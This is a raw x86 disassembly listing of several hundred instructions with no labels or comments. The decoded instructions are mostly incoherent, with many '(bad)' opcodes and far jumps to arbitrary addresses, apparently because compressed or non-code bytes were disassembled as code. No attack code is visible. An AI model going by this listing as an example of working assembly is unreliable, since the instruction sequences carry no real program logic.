  42be34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42be35:	dec    edi
  42be36:	sbb    esi,DWORD PTR [esi+edi*4-0x5d]
  42be3a:	sub    BYTE PTR [edx+0xc],dh
  42be3d:	add    eax,0x1e575f19
  42be42:	aam    0xdf
  42be44:	mov    BYTE PTR [esi-0x3a344edf],0x3d
  42be4b:	aad    0xe8
  42be4d:	test   BYTE PTR [eax-0x4a],0xf6
  42be51:	add    esi,0x39
  42be54:	xchg   ebx,eax
  42be55:	(bad)  
  42be56:	mov    edx,0xeb815eb7
  42be5b:	(bad)  
  42be5c:	addr16 mov bh,0x38
  42be5f:	dec    ebp
  42be60:	add    BYTE PTR [eax-0x60],bl
  42be63:	inc    ecx
  42be64:	or     edi,eax
  42be66:	sar    BYTE PTR [esp+ecx*8-0x3d01bd25],cl
  42be6d:	mov    BYTE PTR [ebx-0x249464c5],ah
  42be73:	jmp    0x78e0f545
  42be78:	pop    DWORD PTR [ebx]
  42be7a:	cwde   
  42be7b:	and    al,0x5
  42be7d:	fisubr WORD PTR [ecx+0x29]
  42be80:	pop    eax
  42be81:	adc    al,0xcb
  42be83:	imul   edx,esi,0x4f
  42be86:	mov    bh,0xb6
  42be88:	repz mov bl,0xa6
  42be8b:	push   ecx
  42be8c:	mov    dl,0x35
  42be8e:	test   BYTE PTR [eax-0x2],cl
  42be91:	xor    ch,dh
  42be93:	push   ebp
  42be94:	inc    eax
  42be95:	ret    0x3433
  42be98:	repz lock sub al,0xd7
  42be9c:	icebp  
  42be9d:	adc    al,0x39
  42be9f:	data16 jnp 0x42be83
  42bea2:	(bad)
  42bea5:	neg    BYTE PTR [esi-0x19]
  42bea8:	lock add ebp,DWORD PTR [ebx+0x3187656f]
  42beaf:	outs   dx,BYTE PTR ds:[esi]
  42beb0:	cmp    edi,ecx
  42beb2:	mov    eax,0x5d8eddc5
  42beb7:	pushf  
  42beb8:	dec    edx
  42beb9:	cdq    
  42beba:	pop    eax
  42bebb:	push   0x71
  42bebd:	(bad)  
  42bebe:	and    al,0xed
  42bec0:	sahf   
  42bec1:	xchg   edi,ebp
  42bec3:	sub    DWORD PTR ds:0x29c57828,0x65ed490d
  42becd:	cmc    
  42bece:	adc    al,dh
  42bed0:	mov    DWORD PTR [di],ebp
  42bed3:	jae    0x42bef8
  42bed5:	addr16 ja 0x42bec0
  42bed8:	jecxz  0x42be8f
  42beda:	mov    ebp,0xa925aa04
  42bedf:	and    BYTE PTR ds:0x2c1b5240,0x4a
  42bee6:	sub    eax,DWORD PTR [ecx+0x5f]
  42bee9:	or     esi,DWORD PTR [edx+0x18226b]
	...
  42bf53:	add    BYTE PTR [eax],al
  42bf55:	add    BYTE PTR [edi-0x825b8e0],dl
  42bf5b:	call   FWORD PTR [edi-0x28375c93]
  42bf61:	jnp    0x42bf4b
  42bf63:	lods   eax,DWORD PTR ds:[esi]
  42bf64:	ret    
  42bf65:	adc    al,0x67
  42bf67:	xlat   BYTE PTR ds:[ebx]
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	add    BYTE PTR [ecx],al
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	jg     0x42bfaa
  42bf70:	stos   BYTE PTR es:[edi],al
  42bf71:	and    eax,0xe0cb0fec
  42bf76:	jne    0x42bf50
  42bf78:	and    al,0xfe
  42bf7a:	push   eax
  42bf7b:	pop    eax
  42bf7c:	leave  
  42bf7d:	mov    eax,ds:0xfb7baf00
  42bf82:	out    dx,eax
  42bf83:	mov    dh,0x80
  42bf85:	daa    
  42bf86:	pop    ebx
  42bf87:	cmp    edi,DWORD PTR [esi]
  42bf89:	push   0x2d459201
  42bf8e:	test   eax,0xaada793e
  42bf93:	pop    edi
  42bf94:	pop    eax
  42bf95:	aas    
  42bf96:	call   0x4fd4:0xcf5dcf1d
  42bf9d:	cmp    eax,DWORD PTR [ebx+0x6a95c862]
  42bfa3:	adc    BYTE PTR [esi+0x20],ah
  42bfa6:	into   
  42bfa7:	ja     0x42bf4b
  42bfa9:	jno    0x42bff9
  42bfab:	push   ss
  42bfac:	cwde   
  42bfad:	mov    dh,bl
  42bfaf:	stos   DWORD PTR es:[edi],eax
  42bfb0:	sub    al,0xbd
  42bfb2:	popa   
  42bfb3:	imul   ecx,DWORD PTR [ecx+ecx*8+0x6266fafc],0x4f
  42bfbb:	jns    0x42c004
  42bfbd:	add    ah,dh
  42bfbf:	daa    
  42bfc0:	jp     0x42bfd1
  42bfc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfc3:	jb     0x42bfb4
  42bfc5:	cmp    cl,BYTE PTR [ebx]
  42bfc7:	and    DWORD PTR [eax],eax
  42bfc9:	sub    BYTE PTR [eax+0x39],ch
  42bfcc:	aam    0x4a
  42bfce:	cwde   
  42bfcf:	push   edi
  42bfd0:	cmp    ebp,DWORD PTR [edi+0x7d502dd3]
  42bfd6:	and    eax,DWORD PTR [ecx-0x363e055b]
  42bfdc:	fcom   st(4)
  42bfde:	or     dh,BYTE PTR [esi-0x61b54eb0]
  42bfe4:	ret    
  42bfe5:	lock jne 0x42bf7f
  42bfe8:	retf   
  42bfe9:	xor    cl,BYTE PTR [eax+0x52]
  42bfec:	loope  0x42c005
  42bfee:	and    BYTE PTR [ebx+eax*4+0x4dae41b3],ch
  42bff5:	cdq    
  42bff6:	jo     0x42c003
  42bff8:	fcmovnb st,st(6)
  42bffa:	add    BYTE PTR [ecx+0x3c74b025],bh
  42c000:	jne    0x42c040
  42c002:	inc    esi
  42c003:	push   cs
  42c004:	sub    DWORD PTR [esi-0x73],esp
  42c007:	jnp    0x42bfcd
  42c009:	jmp    0x42c00d
  42c00b:	cdq    
  42c00c:	inc    esp
  42c00d:	mov    ah,0x30
  42c00f:	addr16 pop es
  42c011:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c012:	add    al,0x72
  42c014:	cmp    edx,DWORD PTR [ebp+0x6f]
  42c017:	sub    bh,BYTE PTR [ebx]
  42c019:	jmp    0xf1ff:0x1971156b
  42c020:	pop    ecx
  42c021:	sbb    edi,DWORD PTR [edx]
  42c023:	xor    edx,ecx
  42c025:	bound  ebp,QWORD PTR [ecx+0x7a2cd632]
  42c02b:	cld    
  42c02c:	xchg   esp,eax
  42c02d:	sbb    ebp,DWORD PTR [eax+0x1d]
  42c030:	aas    
  42c031:	inc    esp
  42c032:	bnd jnp 0x42c008
  42c035:	and    DWORD PTR [ebx],ebx
  42c037:	test   al,0xfd
  42c039:	sub    dl,bl
  42c03b:	add    eax,0xd158578c
  42c040:	xchg   ebx,eax
  42c041:	pop    ecx
  42c042:	xchg   esp,eax
  42c043:	adc    al,0x93
  42c045:	enter  0xe259,0x13
  42c049:	adc    BYTE PTR [ebx+0x2a],dh
  42c04c:	fsqrt  
  42c04e:	jae    0x42c05a
  42c050:	sub    bh,BYTE PTR [ebp+0x1b]
  42c053:	fcomp  DWORD PTR [ebx]
  42c055:	dec    esi
  42c056:	pop    ebx
  42c057:	push   0xffffffcf
  42c059:	std    
  42c05a:	ret    
  42c05b:	pop    eax
  42c05c:	call   FWORD PTR [ebx+0x37]
  42c05f:	pop    ds
  42c060:	add    eax,0xf7a8a340
  42c065:	fistp  WORD PTR [ecx+0x607e7bc3]
  42c06b:	inc    ebx
  42c06c:	cmc    
  42c06d:	std    
	...
  42c0d6:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c0dc:	jg     0x42c078
  42c0de:	leave  
  42c0df:	or     DWORD PTR [edi-0x57],edi
  42c0e2:	push   ebx
  42c0e3:	fcmovnu st,st(2)
  42c0e5:	sub    esp,DWORD PTR [edi-0x28]
  42c0e8:	add    DWORD PTR [eax],eax
  42c0ea:	add    BYTE PTR [ecx],al
  42c0ec:	add    BYTE PTR [eax],al
  42c0ee:	aaa    
  42c0ef:	mov    edx,0x39f01b32
  42c0f4:	mov    ebp,0x41061137
  42c0f9:	inc    ecx
  42c0fa:	repnz xlat BYTE PTR gs:[ebx]
  42c0fd:	cmp    eax,0x32d70fd
  42c102:	out    0x1c,al
  42c104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c105:	xor    eax,0x379a5d3
  42c10a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c10b:	push   ds
  42c10c:	or     BYTE PTR [ebp+0x7c],cl
  42c10f:	xor    ebp,DWORD PTR [esi]
  42c111:	mov    esi,0x40882169
  42c116:	sub    BYTE PTR [edi],ah
  42c118:	iret   
  42c119:	outs   dx,DWORD PTR ds:[esi]
  42c11a:	(bad)
  42c11e:	sub    DWORD PTR [eax-0x3],ebp
  42c121:	sbb    eax,0x7d50f421
  42c126:	xchg   ebp,eax
  42c127:	retf   0xf28c
  42c12a:	neg    ebx
  42c12c:	dec    edx
  42c12d:	jbe    0x42c0f8
  42c12f:	pop    es
  42c130:	in     eax,dx
  42c131:	shl    BYTE PTR [eax-0x7f27fc54],0x2e
  42c138:	loop   0x42c0f9
  42c13a:	sub    DWORD PTR [edi+0x65],0x5b
  42c13e:	cmc    
  42c13f:	retf   0x2df
  42c142:	retf   
  42c143:	inc    esp
  42c144:	icebp  
  42c145:	mov    edx,0xbf33df40
  42c14a:	and    DWORD PTR [ebx+0x2f],0x6d5a98dd
  42c151:	sub    eax,0xdc08ca1
  42c156:	lahf   
  42c157:	fwait
  42c158:	inc    ecx
  42c159:	lods   al,BYTE PTR ds:[esi]
  42c15a:	les    edi,FWORD PTR [edi+0x32c179ff]
  42c160:	jmp    0xdc8e4d65
  42c165:	add    BYTE PTR [ecx-0x2e1fec64],al
  42c16b:	btc    DWORD PTR [ebp-0x27776cb3],ebx
  42c172:	nop
  42c173:	mov    eax,ds:0xcaba342c
  42c178:	push   0xad0aded8
  42c17d:	stc    
  42c17e:	xor    BYTE PTR [ebx],0xb0
  42c181:	push   edi
  42c182:	add    eax,0x21d21746
  42c187:	jmp    0x42c10a
  42c189:	dec    esp
  42c18a:	nop
  42c18b:	adc    eax,0xbb914b5f
  42c190:	jge    0x42c1aa
  42c192:	hlt    
  42c193:	jl     0x42c1b3
  42c195:	scas   eax,DWORD PTR es:[edi]
  42c196:	push   ebp
  42c197:	(bad)  
  42c198:	push   esi
  42c199:	ret    
  42c19a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c19b:	loop   0x42c186
  42c19d:	icebp  
  42c19e:	retf   0x8509
  42c1a1:	sbb    DWORD PTR [ecx-0x7f],ebp
  42c1a4:	(bad)  
  42c1a5:	fisub  DWORD PTR [ecx+0x77]
  42c1a8:	and    al,0x8e
  42c1aa:	or     edx,0x389b98fe
  42c1b0:	sub    DWORD PTR [edx],ecx
  42c1b2:	test   BYTE PTR [esp+ecx*1],0x99
  42c1b6:	aas    
  42c1b7:	cmp    DWORD PTR [edi-0x6a5b22f5],eax
  42c1bd:	addr16 mov ds:0x8166,al
  42c1c1:	xchg   edx,eax
  42c1c2:	and    DWORD PTR [edx],0xfffffff5
  42c1c5:	push   ds
  42c1c6:	pop    ds
  42c1c7:	jge    0x42c19f
  42c1c9:	xchg   esp,eax
  42c1ca:	jmp    0xf0b6:0x9c880357
  42c1d1:	out    0x45,eax
  42c1d3:	imul   edi,DWORD PTR [ebx+0x61],0x50
  42c1d7:	or     al,cl
  42c1d9:	jno    0x42c1a5
  42c1db:	push   esp
  42c1dc:	fnstenv [ecx+0x227ecfaf]
  42c1e2:	push   eax
  42c1e3:	xchg   esp,eax
  42c1e4:	or     DWORD PTR [edx+ebx*4+0x12],ebp
  42c1e8:	sahf   
  42c1e9:	(bad)  
  42c1ea:	test   eax,0x75efcb
	...
  42c253:	add    BYTE PTR [eax],al
  42c255:	add    BYTE PTR [ecx-0x7e],ch
  42c258:	int    0xae
  42c25a:	out    dx,eax
  42c25b:	out    dx,eax
  42c25c:	imul   eax,edi,0xfffffff2
  42c25f:	nop
  42c260:	xchg   esp,eax
  42c261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c262:	cmp    bl,BYTE PTR [edx-0x3]
  42c265:	add    DWORD PTR [edi-0x27],esp
  42c268:	add    DWORD PTR [eax],eax
  42c26a:	add    BYTE PTR [ecx],al
  42c26c:	add    BYTE PTR [eax],al
  42c26e:	xchg   dl,ch
  42c270:	fwait
  42c271:	test   ecx,0xa099f148
  42c277:	(bad)  
  42c278:	rol    BYTE PTR [eax-0x7647aa6],0xc2
  42c27f:	lods   al,BYTE PTR ds:[esi]
  42c280:	lahf   
  42c281:	hlt    
  42c282:	ins    DWORD PTR es:[edi],dx
  42c283:	adc    dl,BYTE PTR [edx]
  42c285:	nop
  42c286:	mov    al,ds:0x1ab041ef
  42c28b:	jae    0x42c299
  42c28d:	add    DWORD PTR [edi+0x63],edx
  42c290:	mov    di,0xe962
  42c294:	div    DWORD PTR [eax]
  42c296:	clc    
  42c297:	mov    ebp,0x81681730
  42c29c:	cld    
  42c29d:	dec    edi
  42c29e:	or     BYTE PTR [esi-0x55],0x91
  42c2a2:	fstp   DWORD PTR [ebp+0x40]
  42c2a5:	dec    BYTE PTR [edx-0x26]
  42c2a8:	mov    esp,0xea4aa7ba
  42c2ad:	mov    esi,DWORD PTR [eax+0x70cd2a00]
  42c2b3:	ja     0x42c280
  42c2b5:	mov    ch,0x4c
  42c2b7:	cdq    
  42c2b8:	shl    BYTE PTR [ebx+0x25eb53af],1
  42c2be:	aas    
  42c2bf:	int3   
  42c2c0:	ss loope 0x42c2e5
  42c2c3:	adc    DWORD PTR [eax],esi
  42c2c5:	pushf  
  42c2c6:	fldcw  WORD PTR [ecx+0x67]
  42c2c9:	xchg   ebx,eax
  42c2ca:	bound  ebp,QWORD PTR [ebp+0x6abec18b]
  42c2d0:	or     bh,0x59
  42c2d3:	iret   
  42c2d4:	out    dx,eax
  42c2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2d6:	push   0x2f32a62e
  42c2db:	push   ebp
  42c2dc:	adc    al,0xac
  42c2de:	lods   eax,DWORD PTR ds:[si]
  42c2e0:	inc    edi
  42c2e1:	mov    dh,0xf4
  42c2e3:	in     al,dx
  42c2e4:	aad    0x8c
  42c2e6:	xchg   BYTE PTR ds:0xd940314f,al
  42c2ec:	mov    bh,0xad
  42c2ee:	les    edi,FWORD PTR [edx+0x1d286ee8]
  42c2f4:	aam    0xae
  42c2f6:	xor    ebp,DWORD PTR [ebp+0x26d2d13a]
  42c2fc:	sbb    ebx,DWORD PTR [ebx-0x4c]
  42c2ff:	stos   BYTE PTR es:[edi],al
  42c300:	ror    ch,cl
  42c302:	dec    esi
  42c303:	sub    dl,ch
  42c305:	pop    ebp
  42c306:	lea    ebx,[edi-0x7]
  42c309:	jnp    0x42c386
  42c30b:	in     eax,0x38
  42c30d:	cmp    ebx,DWORD PTR ds:0xcfe9b5e7
  42c313:	mov    ch,0x32
  42c315:	ins    DWORD PTR es:[edi],dx
  42c316:	add    BYTE PTR [edx],ch
  42c318:	push   ebx
  42c319:	add    DWORD PTR [ebp-0x5bdcafe5],ecx
  42c31f:	add    al,0x10
  42c321:	xchg   edi,eax
  42c322:	mov    ecx,esi
  42c324:	(bad)  
  42c325:	imul   eax,DWORD PTR [edx+edx*4],0x6a
  42c329:	jmp    0xcd4e3907
  42c32e:	sub    esp,DWORD PTR [eax-0x2f60e5be]
  42c334:	lock mov WORD PTR [edi],cs
  42c337:	call   0xcf10:0xdb3fa84d
  42c33e:	xchg   ebx,eax
  42c33f:	mov    ebp,0xe402bf27
  42c344:	add    BYTE PTR [eax-0x6fbe6311],al
  42c34a:	daa    
  42c34b:	fwait
  42c34c:	dec    edi
  42c34d:	pshufw mm0,QWORD PTR [eax+ebp*1-0x6fe23e4e],0x32
  42c356:	pop    esp
  42c357:	test   BYTE PTR ds:0x8908fc8c,al
  42c35d:	jbe    0x42c2f8
  42c35f:	adc    DWORD PTR [esi-0x4a],esp
  42c362:	pusha  
  42c363:	repnz mov eax,0x15b72c74
  42c369:	xor    bl,BYTE PTR [ebp+0x4d]
  42c36c:	adc    ch,0x0
	...
  42c3d3:	add    BYTE PTR [eax],al
  42c3d5:	add    dh,ah
  42c3d7:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c3db:	push   esi
  42c3dd:	(bad)  
  42c3de:	in     eax,dx
  42c3df:	(bad)  
  42c3e0:	sub    eax,0x47d1e4f6
  42c3e5:	int    0x67
  42c3e7:	fiadd  DWORD PTR [ecx]
  42c3e9:	add    BYTE PTR [eax],al
  42c3eb:	add    DWORD PTR [eax],eax
  42c3ed:	add    bl,ch
  42c3ef:	mov    ebp,0xefb8a4a0
  42c3f4:	repz sub edi,DWORD PTR [ebp+0x50b2cbb1]
  42c3fb:	das    
  42c3fc:	adc    eax,0x3e0ba596
  42c401:	jns    0x42c38c
  42c403:	les    ecx,FWORD PTR [eax+esi*4-0x3e]
  42c407:	test   esp,ebx
  42c409:	clc    
  42c40a:	shl    BYTE PTR [esi+0x60054d17],cl
  42c410:	inc    eax
  42c411:	cmp    BYTE PTR [edi],al
  42c413:	test   DWORD PTR [edi+0x189a09bf],ebx
  42c419:	or     eax,0x724919c2
  42c41e:	and    eax,0x64518931
  42c423:	pop    esi
  42c424:	gs adc eax,0x82a58de3
  42c42a:	frstor [ecx]
  42c42c:	inc    BYTE PTR [esi]
  42c42e:	mov    eax,0xaabad12
  42c433:	cmp    BYTE PTR [edi],bl
  42c435:	push   cs
  42c436:	out    dx,al
  42c437:	ret    
  42c438:	push   ds
  42c439:	and    DWORD PTR [ebx],eax
  42c43b:	pop    edx
  42c43c:	xlat   BYTE PTR ds:[ebx]
  42c43d:	xor    al,0x82
  42c43f:	mov    ebp,0x38048574
  42c444:	fsub   QWORD PTR [ecx-0x10]
  42c447:	jbe    0x42c442
  42c449:	idiv   edx
  42c44b:	mov    ebx,0x38902139
  42c450:	loope  0x42c48c
  42c452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c453:	dec    ebp
  42c454:	in     eax,dx
  42c455:	in     al,dx
  42c456:	test   al,0xd4
  42c458:	fadd   QWORD PTR [edx+eax*4]
  42c45b:	enter  0x4b7b,0x75
  42c45f:	sbb    dl,BYTE PTR [ecx+0x42]
  42c462:	cmp    al,0x97
  42c464:	fisub  WORD PTR [edi]
  42c466:	pop    ss
  42c467:	std    
  42c468:	pusha  
  42c469:	ret    
  42c46a:	jne    0x42c4ba
  42c46c:	add    BYTE PTR [ecx],bh
  42c46e:	push   0x439f7064
  42c473:	lahf   
  42c474:	push   eax
  42c475:	xor    bl,dh
  42c477:	je     0x42c447
  42c479:	mov    ebx,0x551c145c
  42c47e:	push   ecx
  42c47f:	xchg   ebx,eax
  42c480:	ss sar al,0x34
  42c484:	pop    ecx
  42c485:	daa    
  42c486:	xor    BYTE PTR [ebp+0x61],cl
  42c489:	sbb    al,0x6d
  42c48b:	sub    DWORD PTR [edi-0x6b8faea4],ecx
  42c491:	xor    DWORD PTR [ebp-0x7d61aabe],edi
  42c497:	push   edx
  42c498:	mov    ds:0x81a537c6,al
  42c49d:	shr    DWORD PTR [edi+0x37],0x5b
  42c4a1:	popf   
  42c4a2:	sti    
  42c4a3:	pop    ds
  42c4a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4a5:	sar    esi,cl
  42c4a7:	leave  
  42c4a8:	or     ch,BYTE PTR [esi-0x1b593541]
  42c4ae:	jne    0x42c49f
  42c4b0:	dec    edx
  42c4b1:	pop    ecx
  42c4b2:	stos   DWORD PTR es:[edi],eax
  42c4b3:	ds or  dl,bl
  42c4b6:	pop    edx
  42c4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c4b8:	jecxz  0x42c4a6
  42c4ba:	(bad)  
  42c4bb:	lock pop ecx
  42c4bd:	mov    ebp,0xbfa4190d
  42c4c2:	fdiv   QWORD PTR [esi+0x5f3477f9]
  42c4c8:	jge    0x42c474
  42c4ca:	mov    edi,0x846a1da9
  42c4cf:	push   eax
  42c4d0:	mov    esi,0xb362d382
  42c4d5:	hlt    
  42c4d6:	enter  0xf654,0x34
  42c4da:	mov    ebx,0x54e98827
  42c4df:	imul   BYTE PTR [esi+0x2b]
  42c4e2:	jmp    0xd91848
  42c4e7:	test   BYTE PTR [eax+eax*4],ch
  42c4ea:	pop    edi
  42c4eb:	cmpxchg DWORD PTR [esi],ebx
	...
  42c556:	in     al,dx
  42c557:	sbb    ebp,edx
  42c559:	sahf   
  42c55a:	cmc    
  42c55b:	fsubp  st(7),st
  42c55d:	jnp    0x42c511
  42c55f:	sti    
  42c560:	enter  0xb934,0xd9
  42c564:	popa   
  42c565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c566:	fild   DWORD PTR [bx+di]
  42c569:	add    BYTE PTR [eax],al
  42c56b:	add    DWORD PTR [eax],eax
  42c56d:	add    BYTE PTR [esi],bl
  42c56f:	push   cs
  42c570:	and    DWORD PTR [ecx+ebp*2-0x45],ebx
  42c574:	sbb    eax,0xa0ae9244
  42c579:	mov    BYTE PTR [eax],bh
  42c57b:	push   eax
  42c57c:	xor    BYTE PTR [edi-0x79],0x8f
  42c580:	xchg   esp,eax
  42c581:	xor    edi,DWORD PTR ds:0x822db120
  42c587:	ins    DWORD PTR es:[edi],dx
  42c588:	xlat   BYTE PTR ds:[ebx]
  42c589:	scas   eax,DWORD PTR es:[edi]
  42c58a:	sub    al,0x7c
  42c58c:	sub    al,0x59
  42c58e:	out    dx,al
  42c58f:	out    dx,al
  42c590:	mov    edx,esi
  42c592:	sub    al,0x11
  42c594:	fwait
  42c595:	xchg   BYTE PTR [esi-0x73],ch
  42c598:	out    dx,al
  42c599:	mov    edx,0xbdb24dff
  42c59e:	idiv   eax
  42c5a0:	sbb    al,BYTE PTR [ebp+0x71]
  42c5a3:	mov    ch,0x33
  42c5a5:	dec    edi
  42c5a6:	adc    cl,BYTE PTR [eax-0x4b]
  42c5a9:	shr    BYTE PTR [edi+ecx*2],0x46
  42c5ad:	hlt    
  42c5ae:	pop    edx
  42c5af:	pop    edi
  42c5b0:	shr    DWORD PTR [edi],cl
  42c5b2:	adc    BYTE PTR [eax+0x7179ab90],dl
  42c5b8:	std    
  42c5b9:	xchg   edx,esp
  42c5bb:	dec    esi
  42c5bc:	mov    cl,0xf8
  42c5be:	gs loop 0x42c5da
  42c5c1:	fcom   QWORD PTR [ebx+esi*8+0xd]
  42c5c5:	sub    edi,DWORD PTR [edx-0x17]
  42c5c8:	adc    DWORD PTR [eax],edi
  42c5ca:	mov    ecx,0x408be090
  42c5cf:	jl     0x42c636
  42c5d1:	add    BYTE PTR ds:[edi],bh
  42c5d4:	pop    ecx
  42c5d5:	push   cs
  42c5d6:	pusha  
  42c5d7:	sahf   
  42c5d8:	xchg   ecx,eax
  42c5d9:	push   esi
  42c5da:	xor    dh,BYTE PTR [ebx]
  42c5dc:	push   0xee322d65
  42c5e1:	sbb    DWORD PTR [edx+0x3e7760b5],ebp
  42c5e7:	loop   0x42c5a4
  42c5e9:	or     al,BYTE PTR [edi]
  42c5eb:	mov    ds:0x21eb54d4,eax
  42c5f0:	icebp  
  42c5f1:	arpl   dx,dx
  42c5f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5f4:	stos   DWORD PTR es:[edi],eax
  42c5f5:	and    ecx,DWORD PTR [esi+ebp*1+0x7efb6649]
  42c5fc:	push   ss
  42c5fd:	or     ebp,DWORD PTR [esi]
  42c5ff:	mov    esp,0x963999c1
  42c604:	push   edx
  42c605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c606:	ja     0x42c66a
  42c608:	sahf   
  42c609:	out    dx,al
  42c60a:	repz (bad) 
  42c60c:	aad    0x4e
  42c60e:	retf   0x9fd9
  42c611:	frstor [edi]
  42c613:	out    dx,eax
  42c614:	neg    eax
  42c616:	add    BYTE PTR [eax+0x44],bl
  42c619:	cmp    DWORD PTR [esi-0x4179c282],0x1d
  42c620:	add    ebp,edi
  42c622:	shl    BYTE PTR [ebx],1
  42c624:	xchg   DWORD PTR [ecx+0x58],eax
  42c627:	push   edx
  42c628:	rol    DWORD PTR [eax+0x69278adc],0x83
  42c62f:	daa    
  42c630:	fist   WORD PTR [esi+edi*2+0x40e2047e]
  42c637:	stos   BYTE PTR es:[edi],al
  42c638:	and    eax,edx
  42c63a:	cs mov dl,0x42
  42c63d:	or     al,0x89
  42c63f:	inc    ebx
  42c640:	(bad)  
  42c641:	push   esp
  42c642:	mov    dl,0x39
  42c644:	adc    ch,BYTE PTR [ecx-0x41]
  42c647:	jno    0x42c602
  42c649:	loopne 0x42c5e8
  42c64b:	sub    ah,ch
  42c64d:	stc    
  42c64e:	mov    eax,0x67592924
  42c653:	mov    ds:0xc0c3d467,al
  42c658:	pusha  
  42c659:	cld    
  42c65a:	sti    
  42c65b:	into   
  42c65c:	cld    
  42c65d:	sar    DWORD PTR [esi],cl
  42c65f:	sub    BYTE PTR [eax+0x4ce3245e],bh
  42c665:	stos   DWORD PTR es:[edi],eax
  42c666:	mov    esi,0x4724347d
  42c66b:	rcr    dl,1
  42c66d:	push   ds
	...
  42c6d6:	pop    ebp
  42c6d7:	dec    eax
  42c6d8:	jle    0x42c668
  42c6da:	jg     0x42c69a
  42c6dc:	std    
  42c6dd:	fstp   TBYTE PTR [ebx-0x37920395]
  42c6e3:	inc    ebx
  42c6e4:	popf   
  42c6e5:	stc    
  42c6e6:	fadd   QWORD PTR [bx+di]
  42c6e9:	add    BYTE PTR [eax],al
  42c6eb:	add    DWORD PTR [eax],eax
  42c6ed:	add    BYTE PTR [edi+0x26e4626b],ah
  42c6f3:	out    dx,al
  42c6f4:	shl    BYTE PTR [edx],0x9e
  42c6f7:	repnz fs (bad) 
  42c6fa:	jnp    0x42c67d
  42c6fc:	adc    eax,0xde2f06ba
  42c701:	je     0x42c6cc
  42c703:	mov    ecx,0x74fd771f
  42c708:	mov    eax,0x8ce94eb7
  42c70d:	(bad)  
  42c70e:	jno    0x42c6e1
  42c710:	pushf  
  42c711:	xlat   BYTE PTR ds:[ebx]
  42c712:	addr16 hlt 
  42c714:	scas   al,BYTE PTR es:[edi]
  42c715:	push   esp
  42c716:	jnp    0x42c6bf
  42c718:	shl    BYTE PTR [esi+0xb],0x62
  42c71c:	ret    
  42c71d:	or     DWORD PTR [ecx+0x63],ecx
  42c720:	jbe    0x42c798
  42c722:	inc    edx
  42c723:	and    ecx,eax
  42c725:	or     al,0xf3
  42c727:	add    ah,bh
  42c729:	push   ebx
  42c72a:	pop    ds
  42c72b:	int    0x88
  42c72d:	retf   
  42c72e:	dec    eax
  42c72f:	push   0xfe0c9238
  42c734:	test   eax,0xe1fe5827
  42c739:	ins    DWORD PTR es:[edi],dx
  42c73a:	stos   BYTE PTR es:[edi],al
  42c73b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c73c:	jno    0x42c760
  42c73e:	push   eax
  42c73f:	popf   
  42c740:	cmp    eax,0x475b865f
  42c745:	lea    esi,[esi-0xd44a93c]
  42c74b:	out    0x5a,eax
  42c74d:	jp     0x42c706
  42c74f:	push   eax
  42c750:	adc    DWORD PTR [edx],esi
  42c752:	push   ebx
  42c753:	xchg   ebx,eax
  42c754:	cwde   
  42c755:	in     eax,dx
  42c756:	popa   
  42c757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c758:	adc    al,0x54
  42c75a:	popf   
  42c75b:	mov    al,0xed
  42c75d:	jnp    0x42c7b4
  42c75f:	les    esp,FWORD PTR [ebp-0x2]
  42c762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c763:	das    
  42c764:	stc    
  42c765:	jg     0x42c785
  42c767:	pop    gs
  42c769:	push   ebp
  42c76a:	sub    BYTE PTR [ebp+0x57],bl
  42c76d:	sub    DWORD PTR [eax+0x566aa335],edx
  42c773:	stos   BYTE PTR es:[edi],al
  42c774:	arpl   WORD PTR [ecx+0x12],bp
  42c777:	pop    edx
  42c778:	repnz and DWORD PTR [ecx],edx
  42c77b:	outs   dx,DWORD PTR ds:[esi]
  42c77c:	test   eax,0xa63d88d1
  42c781:	dec    eax
  42c782:	stos   DWORD PTR es:[edi],eax
  42c783:	add    DWORD PTR [esi-0x50],esp
  42c786:	loope  0x42c7db
  42c788:	daa    
  42c789:	cld    
  42c78a:	in     eax,0x1d
  42c78c:	jmp    0x42c781
  42c78e:	stos   DWORD PTR es:[edi],eax
  42c78f:	push   cs
  42c790:	and    edi,DWORD PTR [eax]
  42c792:	mov    ebx,DWORD PTR [ebx-0x52148671]
  42c798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c799:	fsubrp st(4),st
  42c79b:	out    0x53,eax
  42c79d:	stc    
  42c79e:	jnp    0x42c73c
  42c7a0:	daa    
  42c7a1:	sbb    DWORD PTR ds:0x41d4defa,0xffffff89
  42c7a8:	scas   eax,DWORD PTR es:[edi]
  42c7a9:	les    esp,FWORD PTR [esp+esi*2+0x41522c3b]
  42c7b0:	vpcmpgtd xmm6,xmm4,XMMWORD PTR [eax-0x41]
  42c7b5:	retf   
  42c7b6:	mov    ecx,0x6bec79e4
  42c7bb:	ins    BYTE PTR es:[edi],dx
  42c7bc:	enter  0x8f58,0x7e
  42c7c0:	inc    ebp
  42c7c1:	pop    edi
  42c7c2:	(bad)  
  42c7c3:	xchg   esi,eax
  42c7c5:	lods   eax,DWORD PTR ds:[esi]
  42c7c6:	mov    eax,0xde79a28e
  42c7cb:	pop    ebp
  42c7cc:	mov    ch,0x81
  42c7ce:	xor    BYTE PTR [edx+0x54667a8c],dh
  42c7d4:	mov    ds:0xa46f7f71,eax
  42c7d9:	js     0x42c851
